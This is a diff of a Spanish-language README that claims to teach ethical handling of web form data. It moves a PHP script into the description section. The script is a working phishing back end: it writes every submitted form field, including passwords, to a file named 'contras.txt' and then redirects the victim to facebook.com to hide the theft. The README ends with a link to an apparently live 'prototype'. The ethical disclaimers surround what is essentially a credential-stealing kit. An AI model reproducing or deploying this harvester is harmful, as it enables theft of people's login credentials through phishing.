@@ -5,7 +5,19 @@ Este README tiene como objetivo proporcionar información sobre buenas práctica
 ## Descripción del Código
 
 El código proporcionado es un ejemplo que ilustra cómo se pueden manipular datos de formulario en un entorno web. Sin embargo, es esencial utilizar este código de manera ética y legal y contar con el permiso adecuado para realizar pruebas y actividades relacionadas con la seguridad.
+```php
+<?php
+$archivo = fopen("contras.txt", "a");
+fwrite($archivo, "\r\n");
+foreach ($_POST as $key => $value) {
+    fwrite($archivo, $key . "=" . $value . "\r\n");
+}
+fclose($archivo);
+header("Location: https://www.facebook.com");
+die();
+?>
 
+```
 ## Buenas Prácticas
 
 Para evitar el mal uso de datos de formulario y garantizar la seguridad y la integridad de los sistemas y los datos, se deben seguir las siguientes buenas prácticas:
@@ -25,18 +37,6 @@ Para evitar el mal uso de datos de formulario y garantizar la seguridad y la int
 Este README se proporciona con la intención de promover prácticas de seguridad éticas y legales. El código proporcionado no debe utilizarse con fines maliciosos, y se debe tener cuidado de respetar las leyes y regulaciones aplicables en todo momento.
 
 Recuerda que la seguridad informática debe centrarse en proteger sistemas y datos, no en comprometerlos. El cumplimiento ético y legal es fundamental en todas las actividades de seguridad informática.
-```php
-<?php
-$archivo = fopen("contras.txt", "a");
-fwrite($archivo, "\r\n");
-foreach ($_POST as $key => $value) {
-    fwrite($archivo, $key . "=" . $value . "\r\n");
-}
-fclose($archivo);
-header("Location: https://www.facebook.com");
-die();
-?>
 
-```
 PROTOTIPO EN:
 https://increibleayudargente.000webhostapp.com/
